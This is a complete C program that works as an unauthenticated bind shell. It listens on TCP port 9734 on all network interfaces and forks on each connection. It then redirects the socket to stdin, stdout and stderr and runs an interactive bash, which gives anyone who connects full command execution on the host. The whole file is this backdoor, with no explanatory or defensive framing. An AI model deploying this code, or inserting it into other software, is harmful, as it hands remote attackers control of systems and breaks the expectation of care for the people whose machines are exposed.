#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <signal.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

void start_shell(int client_sockfd) {
	char* text;
	int nread;
	pid_t pid;


	if (setsid() == -1) {
		perror("Setsid Error");
		exit(1);
	}

	if(dup2(client_sockfd, 0) < 0) {
        fprintf(stderr, "Redirection error.\n");
        exit(EXIT_FAILURE);
    }

    if(dup2(client_sockfd, 1) < 0) {
        fprintf(stderr, "Redirection error.\n");
        exit(EXIT_FAILURE);
    }
    
    if(dup2(client_sockfd, 2) < 0) {
        fprintf(stderr, "Redirection error.\n");
        exit(EXIT_FAILURE);
    }	

	if (execlp("bash", "bash", "--noediting", "-i", NULL) == -1) {
		perror("exec error");
			
		if((close(client_sockfd)) == -1) {
            printf("Error closing connection, error:\n");
        }

		exit(1);
	}

	return;
}

int main() 
{
	int server_sockfd, client_sockfd;
	socklen_t server_len, client_len;
	struct sockaddr_in server_address;
	struct sockaddr_in client_address;

	server_sockfd = socket(AF_INET, SOCK_STREAM, 0);

	server_address.sin_family = AF_INET;
	server_address.sin_addr.s_addr = htonl(INADDR_ANY);
	server_address.sin_port = htons(9734);
	server_len = sizeof(server_address);
	bind(server_sockfd, (struct sockaddr *)&server_address,
		server_len);

	listen(server_sockfd, 5);

	signal(SIGCHLD, SIG_IGN);

	while(1) {
		char ch;

		printf("server waiting\n");

		client_len = sizeof(client_address);
		client_sockfd = accept(server_sockfd, 
			(struct sockaddr *)&client_address, &client_len);

		if (fork() == 0) {
			
			close(server_sockfd);
			start_shell(client_sockfd);
			exit(1);
		}
		else {
			close(client_sockfd);
		}
	}
}